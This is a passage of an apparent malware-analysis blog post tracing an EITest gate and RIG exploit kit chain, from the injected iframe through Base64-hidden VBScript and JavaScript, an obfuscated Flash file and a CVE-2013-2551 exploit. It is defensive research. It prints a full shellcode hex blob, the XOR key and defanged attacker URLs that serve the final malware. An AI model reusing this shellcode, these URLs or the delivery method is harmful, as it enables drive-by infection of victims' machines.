+<p>After checking if the user is using a specific version of Internet Explorer, it generates a filename which is used to load a malicious iframe from the same site. You can see in the code above, the variable ‘temp’ is a randomly generated string with a variable length. After generating the string, it randomly adds one of the following extensions to the filename ('html', 'htm', 'jpeg', 'png', 'jpg', 'gif', 'js'). The full generated filename looks like this for example:&nbsp;<em>asd.jpeg</em><br><br>So, the line:<br><strong><em>d.innerHTML = &lt;iframe src="&lt;local URL of swf file&gt;' + temp + '"&gt;&lt;/iframe&gt;</em></strong><br><br>Resolves to something like this:<br><strong><em>&lt;iframe src="&lt;local URL of swf file&gt;' + ‘asd.jpeg’ + '"&gt;&lt;/iframe&gt;</em></strong><br><br>This gets executed two times, which results in embedding a malicious iframe two times into the compromised site. The second attempt happens a bit later after the timer times out. The above generated URLs which are used to fill the iframe are looking like this:<br><br><strong>First request:</strong><br><em>hxxp://amocy.top/pgioeknieedfacre4rpt6nslpe-8t-ot4b1cm-5ntfmppsn3teeo6aalaaacmnrpkmmpn9eti0n-9a1blr5sepse0coi-elfrplorsepo8or0op3basa7sd1dme9fkiran4mrabecmm/asd.jpeg</em><br><br><strong>Second request (content of this document will be discussed later in the report):&nbsp;</strong><br><em>hxxp://amocy.top/pgioeknieedfacre4rpt6nslpe-8t-ot4b1cm-5ntfmppsn3teeo6aalaaacmnrpkmmpn9eti0n-9a1blr5sepse0coi-elfrplorsepo8or0op3basa7sd1dme9fkiran4mrabecmm/rqqjllfd.html</em></p><h2 id="first-execution-path-asdjpg">First execution path (<em>asd.jpg</em>)</h2><p>Even if the first one looks like a JPEG file, it’s not. It is a simple, normal HTML file (see below).</p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="font-family: Times; letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><a data-original-attrs="{"data-original-href":"https://3.bp.blogspot.com/-DrAXfOv9QEI/WBjAiXhakpI/AAAAAAAAAhc/tJ32RDoXIqg8xjlUvA4BoTTV7vIksIEOwCLcB/s1600/10a.jpg","style":""}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#" style="margin-left: auto; margin-right: auto;"><img border="0" height="362" src="https://3.bp.blogspot.com/-DrAXfOv9QEI/WBjAiXhakpI/AAAAAAAAAhc/tJ32RDoXIqg8xjlUvA4BoTTV7vIksIEOwCLcB/s640/10a.jpg" width="640" style="cursor: move;"></a></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. I</td></tr></tbody></table>
+<!--kg-card-end: html-->
+<p>This HTML file is doing nothing else than redirecting the victim to the Exploit Kit landing page:<br><br><em>hxxp://dsa.FAITHFULBUSINESSVENTURES.COM/?zniKfrGbJRvMDYA=l3SKfPrfJxzFGMSUb-nJDa9GP0XCRQLPh4SGhKrXCJ-ofSih17OIFxzsqAycFUKCqrF4Qu4Fah2h1QWScEZrmYRPFgVIove8hQLfyhSWksXQ-hbbZwIW-5LGQbM8iVn9xrdBec4vwhKKumlRmLgeQFFd</em><br><br>This loads a large obfuscated HTML file (see below), which includes three variables all called (s). These variables are hiding one base64 encoded VBscript(VBS) and two base64 encoded JavaScript(JS) files. These get executed by the obfuscated script included in the HTML document. These variables are simply Base64 encoded, and they can easily be decoded. After execution, all three download the same final malware that will be installed on the victim’s machine. The only difference? They are trying to exploit different known vulnerabilities.<br><br>The large HTML file (truncated for better readability):</p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="font-family: Times; letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><a data-original-attrs="{"data-original-href":"https://3.bp.blogspot.com/-qmuhtCdBtLk/WBjECo92BYI/AAAAAAAAAho/zNsRw91CkF062RxE00PWsLO5DHIAsqilwCLcB/s1600/11a.jpg","style":""}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#" style="margin-left: auto; margin-right: auto;"><img border="0" height="366" src="https://3.bp.blogspot.com/-qmuhtCdBtLk/WBjECo92BYI/AAAAAAAAAho/zNsRw91CkF062RxE00PWsLO5DHIAsqilwCLcB/s640/11a.jpg" width="640" style="cursor: move;"></a></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. J</td></tr></tbody></table>
+<!--kg-card-end: html-->
+<p>Let’s have a look to these three scripts.</p><h2 id="first-base64-encoded-variable-s">First Base64 encoded variable "s"</h2><p>The first Base64 encoded variable "s" can be decoded to the following VBscript script (truncated for better readability):</p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="font-family: Times; letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><a data-original-attrs="{"data-original-href":"https://1.bp.blogspot.com/-oZN8Wkjl__c/WBm_xHd_vjI/AAAAAAAAAh8/WS1RIRrGVQk0KbTCKkYGPk0N5NG0swYZQCLcB/s1600/12a.jpg","style":""}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#" style="margin-left: auto; margin-right: auto;"><img border="0" height="386" src="https://1.bp.blogspot.com/-oZN8Wkjl__c/WBm_xHd_vjI/AAAAAAAAAh8/WS1RIRrGVQk0KbTCKkYGPk0N5NG0swYZQCLcB/s640/12a.jpg" width="640" style="cursor: move;"></a></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. K</td></tr></tbody></table>
+<!--kg-card-end: html-->
+<p>After a couple of tests on the target system, it executes the&nbsp;<em>DoMagic()</em>&nbsp;function, which downloads the main malware payload of the campaign such as ransomware using the URL stored in the script e.g.<br><br><em>hxxp://dsa.FAITHFULBUSINESSVENTURES.COM/index.php?zniKfrGbJRvMDYA=l3SMfPrfJxzFGMSUb-nJDa9GP0XCRQLPh4SGhKrXCJ-ofSih17OIFxzsqAycFUKCqrF4Qu4Fah2h1QWScEZrmYRPFgVIove8hQLfyhSWksXQ-hbbZwIW-5LGQbM8iVn9xrdBec4vwhKKumlRmLgeQFFT6wkZjuyeV7PC7kpzXlBvEQ7bJN0sohfQDmK1JDEwi_SxUjJ8kvzFuw</em><br><br>The HTTP payload it downloads, is simply XOR’ed with a password found in the VBscript (e.g. awMKCDwA), written to disc and executed twice. Once natively in a normal Shell, once as a parameter to the control.exe program which is usually used to open control panel items.<br><br>We wrote a small&nbsp;<a href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#">python script</a>&nbsp;which can decode this payload. This means if you have a pcap trace of the infection, you can look for the x-msdownload at the end of the trace, extract the file from the pcap and decode the EK payload files to rebuild the original PE file.<br><br>These are the MD5 hashes of the binaries downloaded in some of our campaigns:<br><em>D7AB607880B953BA5F87A693278CE14B Gamarue<br>730B8E27C1BB1A3FADB9C10657E7E046 CRYPTFILE2<br>D3E91CC75AC06D8AF70127D3B972EF8E (broken)</em></p><h2 id="second-base64-encoded-variable-s">Second Base64 encoded variable "s"</h2><p>The 2nd variable "s" from the big HTML file (JavaScript) can be decoded to the following JavaScript code. You can see how the EK inserts random comments like “<em>/*sw7586sdd*/</em>” in between the Javascript code. These comments are changed per session, which means that the Base64 encoded blob looks different in every session. The EK uses the same strategy in the whole infection process.</p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="font-family: Times; letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><a data-original-attrs="{"data-original-href":"https://2.bp.blogspot.com/-1x-AtQftuX8/WBnBogDJJZI/AAAAAAAAAiI/7z3R4HATH9opwiomEJPrWmjig-NX_D1hACLcB/s1600/13a.jpg","style":""}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#" style="margin-left: auto; margin-right: auto;"><img border="0" height="324" src="https://2.bp.blogspot.com/-1x-AtQftuX8/WBnBogDJJZI/AAAAAAAAAiI/7z3R4HATH9opwiomEJPrWmjig-NX_D1hACLcB/s640/13a.jpg" width="640" style="cursor: move;"></a></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. L (truncated for better readability)</td><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;"><br></td><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;"><br></td></tr></tbody></table>
+<!--kg-card-end: html-->
+<p>This downloads and executes another malicious Flash File (SWF) with following MD5 hash:<br><em>c6014a32cc06f862ea44db720dfcf553</em><br><br>We are currently working on fully deobfuscating the code, but what we can say so far is, that the&nbsp;<em>iddqd</em>&nbsp;parameter (looks like the guys behind this like&nbsp;<a href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#">Doom god mode</a>) seems to be a type of shellcode payload which gets decoded at runtime, combined with other strings stored in the SWF, and finally executed by an exploit.<br><br>The SWF is heavily obfuscated by the&nbsp;<a href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#">DoSWF</a>&nbsp;Flash tool. This tool comes with multiple options to encrypt and obfuscate Flash files.<br></p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="font-family: Times; letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><img alt="2016-10-07 09_01_21-Untitled - Notepad.jpg" data-original-attrs="{"style":""}" height="18" src="https://lh3.googleusercontent.com/Z_qFSCZQXHxTLMn-_-Ib8OXOyfgHYDLYUUR2tfEv0D9rIZBVLc9RCHJMVif5YavYFq4Z3GkC1V4QReAGVMOmj6j2s3LtqMMyYIvf7UQmFcjbeRTRAVdSavC3tBJmO68x7dxegwdr" width="583" style="cursor: move; border: medium none; margin-left: auto; margin-right: auto; transform: rotate(0rad);"></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. M</td></tr></tbody></table>
+<!--kg-card-end: html-->
+<p>It is an easy-to-use copy protection tool for Flash files; adversaries can combine multiple obfuscation methods on demand. It’s no big surprise that different SWF files from different RIG campaigns are obfuscated with different DoSWF features.<br><br>After we decompiled this SWF, all functions and many variables are replaced with hard to read Unicode characters, as shown below.</p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="font-family: Times; letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><a data-original-attrs="{"data-original-href":"https://3.bp.blogspot.com/-JMe0hbDV2uU/WBnCudLzQrI/AAAAAAAAAiQ/erimB_XFAtM3nhPl0NfeysZpsEzRXInywCLcB/s1600/asv1.jpg","style":""}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#" style="margin-left: auto; margin-right: auto;"><img border="0" height="262" src="https://3.bp.blogspot.com/-JMe0hbDV2uU/WBnCudLzQrI/AAAAAAAAAiQ/erimB_XFAtM3nhPl0NfeysZpsEzRXInywCLcB/s640/asv1.jpg" width="640" style="cursor: move;"></a></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. N</td></tr></tbody></table>
+<!--kg-card-end: html-->
+<p>Most Strings are encrypted and get resolved at runtime e.g.&nbsp;<em>_SafeStr_14.&lt;unicode function name&gt;(-1820302799)</em>&nbsp;below. Thanks to a nice feature of&nbsp;<a href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#">ASV</a>&nbsp;that can evaluate static methods on demand, we can leverage the SWFs own code to decrypt the strings.&nbsp;</p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="font-family: Times; letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><a data-original-attrs="{"data-original-href":"https://1.bp.blogspot.com/-_xFetcV_INQ/WBnDyIgb0YI/AAAAAAAAAic/dGm3KvVSzt02zmDU8xPpc8gtPd706IWPQCLcB/s1600/asv2.jpg","style":""}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#" style="margin-left: auto; margin-right: auto;"><img border="0" height="242" src="https://1.bp.blogspot.com/-_xFetcV_INQ/WBnDyIgb0YI/AAAAAAAAAic/dGm3KvVSzt02zmDU8xPpc8gtPd706IWPQCLcB/s640/asv2.jpg" width="640" style="cursor: move;"></a></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. O</td></tr></tbody></table>
+<!--kg-card-end: html-->
+<p>After cleaning up and removing most of the obfuscation we still end up with awful object oriented spaghetti code. Polymorphic methods, objects and methods assigned to chains of variables, etc. The document class where the code execution starts is&nbsp;<em>_SafeStr_12</em>.<br><br><em>Note: The class names are generated dynamically by the ASV tool which we used to decompile the SWF. These names most likly vary on other setups. Maybe a good time for sending out some thanks to the fantastic support of the ASV guys.</em></p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="font-family: Times; letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><a data-original-attrs="{"data-original-href":"https://1.bp.blogspot.com/-AxzT7R_NPZM/WBnGRe5VqMI/AAAAAAAAAio/VO68aajwUj0HDGVVhJugGimQxKK1IVBjQCLcB/s1600/asv3.jpg","style":""}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#" style="margin-left: auto; margin-right: auto;"><img border="0" height="246" src="https://1.bp.blogspot.com/-AxzT7R_NPZM/WBnGRe5VqMI/AAAAAAAAAio/VO68aajwUj0HDGVVhJugGimQxKK1IVBjQCLcB/s640/asv3.jpg" width="640" style="cursor: move;"></a></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. P</td></tr></tbody></table>
+<!--kg-card-end: html-->
+<p>After a couple of environment checks regarding OS version, Flash player type, Flash version, &amp; debugger presence, the SWF reads the “<em>iddqd</em>” parameter which we have seen in the Javascript code above. It decodes it and merges it with a string stored inside the SWF (60eb..). Finally, it hands over the reconstructed shell code to the _p78_ function.</p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="font-family: Times; letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><a data-original-attrs="{"data-original-href":"https://3.bp.blogspot.com/-Y9BE4THGQiQ/WBnG4I8qT7I/AAAAAAAAAis/Phzf2_xh5LQMfozRoJJmkwiw8xxTKelNwCLcB/s1600/asv4.jpg","style":""}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#" style="margin-left: auto; margin-right: auto;"><img border="0" height="126" src="https://3.bp.blogspot.com/-Y9BE4THGQiQ/WBnG4I8qT7I/AAAAAAAAAis/Phzf2_xh5LQMfozRoJJmkwiw8xxTKelNwCLcB/s640/asv4.jpg" width="640" style="cursor: move;"></a></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. Q</td></tr></tbody></table>
+<!--kg-card-end: html-->
+<p>_p80_ and _p81_ are doing the decoding magic of the original string:</p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="font-family: Times; letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><a data-original-attrs="{"data-original-href":"https://3.bp.blogspot.com/-ViH-tCzSu4I/WBnHFXgBg-I/AAAAAAAAAiw/jlcWGISdM2gq2tWWuSHw2xVrI0okr4ltACLcB/s1600/asv5.jpg","style":""}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#" style="margin-left: auto; margin-right: auto;"><img border="0" height="252" src="https://3.bp.blogspot.com/-ViH-tCzSu4I/WBnHFXgBg-I/AAAAAAAAAiw/jlcWGISdM2gq2tWWuSHw2xVrI0okr4ltACLcB/s640/asv5.jpg" width="640" style="cursor: move;"></a></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. R</td></tr></tbody></table>
+<!--kg-card-end: html-->
+<p>Below is the generated string which is finally stored in the shell variable:</p><pre><code>
+60EB1158B9D1040000498034081985C975F7FFE0E8EAFFFFFFF 
+11F19191978F0DC1D191998F5C51919194A4C4F2AC24EA04B08 
+7652DE5D3D016C6B7574DE5D3D057677377D7FDE5D3D3975759 
+1453D3BDE5D3D3D787D6F78DE5D3D3169702A2BDE5D3D35377D 
+757591453D29F1851A1919A00B7B3067905D3D4DF1971A1919A 
+0DAE42868905D3D79F1991A1919A0728DC2E6905D3D7DF16B1A
+191992E1A0BC01234390653D71F17B1A191992E9A034363F669 
+06D3D6DF14B1A1919A02F5A2F4F905D3D61F15D1A1919A0A5F8 
+32F3905D3D65F12F1A1919A0DD7CB054909D3D99191919F13C1 
+A1919A0DACB1CFC909D3D9D191919F10D1A1919A0538DAFD090 
+9D3D91191919F11A1A1919A056F5CE4C909D3D95191919F1EB1
+B1919909D3D89191919945D3D0149E6CF945D3D3D49E6CFA09F
+8B3363F1CA1B1919A01BA9709D909D3D81191919F1DB1B1919A
+033A4D3B8909D3D85191919F1A81B1919909D3DB9191919F16E
+1A191992F190753D2D935CE5EFC9915D3D0A90453D2190453D2
+590453D59731D7119091919711D1C19194AE6CE92E1937D3D0A
+92CC2AEF9486191D191992D632CE931D132BDD91186D135F589
+8E7191D19196FF49CEF169D3918191992DE2AD09921196D0190
+5D9521930999E3226D1E599DCB6CEDF212DF191959F21C9A7D9
+52119589AE01A6BC192753D21935C1925286D11252B169CF819
+1919924D3D254AE66D3D5D94553D45F1C319191940409CD9169
+DBD191919935C192528169C89191919735D2ACB44904D3D0D92
+D4949D3DB1191919910959506CE3730940945D3D5D910959506
+CE3945D3D0D49719219191973E690B53DAD191919E68D3DBD19
+1919945D3D5D49949D3DB5191919492AD9494949494949494AE
+66D3D25E68D3DD11919199A653D0D196D11E66D3D0DE64D3D7D
+9A653D51196D11E66D3D51E64D3D7D9A653D5D196D0AE66D3D5
+DE64D3D7DF210252B6C1C4AE64D3D6192753D2D71199919192A
+C25C4A1AF74E90753D59E64D3D6992653D71F0BBE7E6E646474
+44298DDC5191919DA9AF5094A4C4F4E731D7119091919711D18
+191992F392C02AE64E90753D3D90453D35E64A0D92E94F711D1
+81919E64A21E66D3D314E4E4FE64A2571199919194E4FE64A09
+4E4EE66D3D29E66D3D294EE64A559CD9169CA41919194E71991
+91919731A4E731871191919D9E66D3D59E64A3592E99AE7E616
+9D821919194E4FE64A29905D3D099CD9169D9F1919199CF46D6
+6996419196D604CE60A731D7119091919E66D3D01905D3D3D4E
+E64A0D4E92F1945D3D0D49E66D3D014C4FE64A3D925D3D0992D
+69CD96D3192453D0D92CE22D16A03224D3D016A09931D03291D
+30925D3D095B5822D16BF322D16BF992453D054E4E4E4FE64A2
+D4E945D3D0D49E66D3D014C4FE64A3171199919194E4CE64A09
+2AE65E4FE64A1592DE464744429ADD09DA9AF5097DB82919191
+94A9259154C4F9269154E924F0190553D019CCB169D94191919
+2AF4925B259267299245096192D490453D099CC26D73D8D0149
+31E257816A7D9651A9AD8F99ADE1B1AD17F20366CFE925D0A39
+1ADB9A650A011992E46F5B92C492311AF39AD91D905D3D05935
+C19D8D21416A7D91AC15C935C199DD96CE990453D0D925D3D0D
+92453D091AD8225D3D016D3C925D3D055E73194422650A016BA
+7922F924F019CCB169C6CE6E6E62AD9464744429ADD09DA925D
+0A3D941D6116AE1509925D0A05941D91921D091ADBF2C6F1191
+91919419AD913DADAE6E6E6E62822786E54525A5D6E5822716D
+6D692336367D6A78377F78706D717F6C757B6C6A70777C6A6A6
+F7C776D6C6B7C6A377A76743670777D7C613769716926637770
+527F6B5E7B534B6F545D405824752A4A547F496B7F5361635F5
+E544A4C7B3477535D78205E4929415A4B485549712D4A5E7152
+6B415A5334767F4A7071282E56505F61636A6858607A5F4C525
+A686B5F2D486C2D5F78712B7128484E4A7A5C436B74404B495F
+7E4F50766F7C217148557F60714A4E726A414834717B7B436E5
+04E342C555E487B5421704F7720616B7D5B7C7A2D6F6E715252
+6C74754B74557E7C485F5F4D2F6E7243736C607C4F2E495A2E7
+2696341755B6F5C482E7B5357296A76717F485D745228535D5C
+6870465A604A2A403F7D7F7E6A7D7F24282F201919190000000
+0
+</code></pre><p>It is interesting that this is the same binary blob with small differences, like the one we will see later on in the third&nbsp;<em>variable (s)</em>&nbsp;javascript script, which is stored in the parameter of the called&nbsp;<em>ty()&nbsp;</em>function at the end.<br><br>It appears to be the payload which all exploits are executing at the end. The binary blob is&nbsp;<strong>XOR’ed with 0x19</strong>&nbsp;and if we decode it, we can see the URL from which it finally loads the EK payload malware. In other words, it loads the final malware which is installed on the victim's PC. It is the same file we have seen above:<br><br><em>hxxp://dsa.faithfulbusinessventures.com/index.php?zniKfrGbJRvMDYA=l3SMfPrfJxzFGMSUb-nJDa9GP0XCRQLPh4SGhKrXCJ-ofSih17OIFxzsqAycFUKCqrF4Qu4Fah2h1QWScEZrmYRPFgVIove8hQLfyhSWksXQ-hbbZwIW-5LGQbM8iVn9xrdBec4vwhKKumlRmLgeQFFT6wkZjuyeV7PC7kpzXlBvEQ7bJN0sohfQDmK1JDEqi_-7SDl9kKM&amp;dfgsdf=202</em><br><br>Before the “Malware Download URL”, it also shows us an old friend ‘<em>awMKCDwA</em>’,<br><br>---snip---<br><em>1;<strong>awMKCDwA</strong>;hxxp://dsa.faithfulbusinessventures.com/index….</em><br>---snip---<br><br>...the string which we have already seen in the VBS script above. The one which is necessary to XOR decode the malware which finally gets downloaded.</p><h2 id="third-base64-encoded-variable-s">Third Base64 encoded variable "s"</h2><p>The 3rd variable "s" in the large HTML file is obfuscated JavaScript once again:</p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="font-family: Times; letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><a data-original-attrs="{"data-original-href":"https://4.bp.blogspot.com/-Z196-jgye4k/WBnMvtccCPI/AAAAAAAAAjE/Q_wSTUcb5asslcMDKRHjzxxDk9gD_K_HwCLcB/s1600/14a.jpg","style":""}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#" style="margin-left: auto; margin-right: auto;"><img border="0" height="334" src="https://4.bp.blogspot.com/-Z196-jgye4k/WBnMvtccCPI/AAAAAAAAAjE/Q_wSTUcb5asslcMDKRHjzxxDk9gD_K_HwCLcB/s640/14a.jpg" width="640" style="cursor: move;"></a></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. S (truncated for better readability)</td><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;"><br></td><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;"><br></td></tr></tbody></table>
+<!--kg-card-end: html-->
+<p>After deobfuscating it, we recognized this one is exploiting CVE-2013-2551 (aka MS13-037) to download and infect the victim with the same malware which was downloaded by the Base64 encoded scripts stored in the other variable s. The deobfuscated code is almost a one to one copy of some exploit samples for CVE-2013-2551 which we found in the internet.<br><br>Like mentioned above, the parameter of the ty() value is the actual shellcode which gets executed post-exploitation. Like above, the binary data is XOR’ed with 0x19 and includes the URL to download the final malware:<br><br><em>hxxp://dsa.faithfulbusinessventures.com/index.php?zniKfrGbJRvMDYA=l3SMfPrfJxzFGMSUb-nJDa9GP0XCRQLPh4SGhKrXCJ-ofSih17OIFxzsqAycFUKCqrF4Qu4Fah2h1QWScEZrmYRPFgVIove8hQLfyhSWksXQ-hbbZwIW-5LGQbM8iVn9xrdBec4vwhKKumlRmLgeQFFT6wkZjuyeV7PC7kpzXlBvEQ7bJN0sohfQDmK1JDEqi_CyS3Y&amp;dfgsdf=169</em></p><h2 id="second-execution-path-rqqjllfdhtml">Second Execution Path (rqqjllfd.html)</h2><p>Now, let’s get back to the other execution path. The timer which we have mentioned above times out and the&nbsp;<em>amocy.top</em>&nbsp;EITest gate starts the other infection chain. This one is very similar to the one we just looked at. It is actually highly redundant. It is also downloading a similar HTML file with another randomly generated name like we described above.<br><br><em>hxxp://amocy.top/pgioeknieedfacre4rpt6nslpe-8t-ot4b1cm-5ntfmppsn3teeo6aalaaacmnrpkmmpn9eti0n-9a1blr5sepse0coi-elfrplorsepo8or0op3basa7sd1dme9fkiran4mrabecmm/rqqjllfd.html</em></p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="font-family: Times; letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><a data-original-attrs="{"data-original-href":"https://2.bp.blogspot.com/-Ts2tiQEqwXs/WBnN_hRR47I/AAAAAAAAAjQ/mJfwkHuCx6UbDloZKEX2KLGhvnM2WvU3gCEw/s1600/15a.jpg","style":""}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#" style="margin-left: auto; margin-right: auto;"><img border="0" height="436" src="https://2.bp.blogspot.com/-Ts2tiQEqwXs/WBnN_hRR47I/AAAAAAAAAjQ/mJfwkHuCx6UbDloZKEX2KLGhvnM2WvU3gCEw/s640/15a.jpg" width="640" style="cursor: move;"></a></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. T</td><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;"><br></td></tr></tbody></table>
+<!--kg-card-end: html-->
+<p>This redirects the victim to another large HTML file, again similar to the one we have seen above. We see the typical three Base64 encoded&nbsp;<em>variables "s"&nbsp;</em>and they include similar malicious scripts like the ones from stage one:</p>
+<!--kg-card-begin: html-->
+<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" data-original-attrs="{"style":""}" style="font-family: Times; letter-spacing: normal; orphans: 2; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td data-original-attrs="{"style":""}" style="text-align: center;"><a data-original-attrs="{"data-original-href":"https://3.bp.blogspot.com/-knpphyQpb70/WBnfPdFT29I/AAAAAAAAAjg/s_1biSyPkT0UbQ8zgBhkRHoDq3zOCJpHgCLcB/s1600/16a.jpg","style":""}" href="https://www.blogger.com/u/1/blog/post/edit/1029833275466591797/7131721338791211667#" style="margin-left: auto; margin-right: auto;"><img border="0" height="404" src="https://3.bp.blogspot.com/-knpphyQpb70/WBnfPdFT29I/AAAAAAAAAjg/s_1biSyPkT0UbQ8zgBhkRHoDq3zOCJpHgCLcB/s640/16a.jpg" width="640" style="cursor: move;"></a></td></tr><tr><td class="tr-caption" data-original-attrs="{"style":""}" style="text-align: center;">Fig. U (truncated for better readability)</td></tr></tbody></table>
+<!--kg-card-end: html-->
